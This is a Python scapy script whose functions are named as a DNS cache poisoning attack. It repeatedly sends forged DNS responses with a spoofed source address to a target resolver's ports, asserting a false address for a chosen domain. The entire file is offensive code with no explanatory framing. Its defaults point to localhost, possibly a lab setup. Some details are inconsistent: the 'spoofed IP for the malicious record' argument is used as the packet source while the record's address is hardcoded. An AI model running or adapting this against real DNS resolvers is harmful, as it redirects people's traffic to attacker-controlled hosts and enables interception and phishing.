import argparse
import time
import dns.message
import dns.query
import dns.rdatatype
from scapy.all import *

def send_dns_response(target_ip, target_port, domain, spoofed_ip):
    # Craft a DNS response packet with spoofed IP and malicious record
    dns_response = IP(src=spoofed_ip, dst=target_ip) / UDP(sport=53, dport=target_port) / \
                   DNS(id=123, qr=1, opcode=0, aa=1, rd=1, ra=1, z=0, rcode=0,
                       qdcount=1, ancount=1, nscount=0, arcount=0,
                       qd=DNSQR(qname=domain, qtype='A', qclass='IN'),
                       an=DNSRR(rrname=domain, rdata='1.2.3.4', ttl=3600))

    # Send the DNS response packet
    send(dns_response, verbose=False)

def cache_poisoning_attack(target_ip, target_ports, domain, spoofed_ip, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        for port in target_ports:
            send_dns_response(target_ip, port, domain, spoofed_ip)
        time.sleep(0.1)  # Adjust the sleep duration as needed

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--target_ip', default="127.0.0.1", help="Target DNS resolver IP address")
    parser.add_argument('--target_ports', nargs='+', type=int, default=[31111, 31112], help="Target DNS resolver ports")
    parser.add_argument('--domain', default="example.com", help="Domain to spoof")
    parser.add_argument('--spoofed_ip', default="1.1.1.1", help="Spoofed IP address for the malicious record")
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')

    args = parser.parse_args()

    cache_poisoning_attack(args.target_ip, args.target_ports, args.domain, args.spoofed_ip, args.duration)